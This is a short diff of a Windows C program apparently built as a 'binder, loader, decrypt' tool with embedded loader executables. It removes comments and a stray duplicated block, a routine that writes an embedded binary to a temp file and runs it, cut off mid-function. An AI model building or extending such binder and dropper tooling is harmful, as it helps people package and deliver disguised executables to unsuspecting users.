@@ -1,10 +1,9 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
-#include <shellapi.h>    // needed for CommandLineToArgvW
+#include <shellapi.h>
 #include <stdio.h>
 
-/* The variable names below depend on how xxd generates them.
-   We define macros to match whatever names are in the headers. */
+/* Map variable names based on which architecture we're building */
 #ifdef FELTY_USE_X64_NAMES
   #define felty_loader_exe      x64_felty_loader_exe
   #define felty_loader_exe_len  x64_felty_loader_exe_len
@@ -71,28 +70,4 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdSh
         MessageBoxW(NULL, L"Unknown mode. Use: binder, loader, decrypt", L"Error", MB_ICONERROR);
     LocalFree(argv);
     return 0;
-}#define WIN32_LEAN_AND_MEAN
-#include <windows.h>
-#include <stdio.h>
-
-BOOL RunFromMemory(unsigned char *data, unsigned int len, const wchar_t *cmdLine)
-{
-    wchar_t tempPath[MAX_PATH];
-    wchar_t tempFile[MAX_PATH];
-    GetTempPathW(MAX_PATH, tempPath);
-    GetTempFileNameW(tempPath, L"FEL", 0, tempFile);
-
-    HANDLE hFile = CreateFileW(tempFile, GENERIC_WRITE, 0, NULL,
-                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
-    DWORD written;
-    WriteFile(hFile, data, len, &written, NULL);
-    CloseHandle(hFile);
-
-    wchar_t cmd[512];
-    wsprintfW(cmd, L"\"%s\" %s", tempFile, cmdLine ? cmdLine : L"");
-
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
-    BOOL success = CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-    if (success)
+}
